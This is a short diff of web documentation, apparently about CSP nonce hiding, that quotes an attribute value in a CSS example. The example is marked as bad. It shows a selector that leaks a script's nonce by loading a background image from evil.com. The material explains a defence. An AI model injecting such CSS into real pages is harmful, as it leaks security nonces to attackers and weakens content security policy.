@@ -34,7 +34,7 @@ However, recent browsers version hide `nonce` values that are accessed this way 
 Nonce hiding helps prevent attackers from exfiltrating nonce data via mechanisms that can grab data from content attributes like this:
 
 ```css example-bad
-script[nonce~=whatever] {
+script[nonce~="whatever"] {
   background: url("https://evil.com/nonce?whatever");
 }
 ```
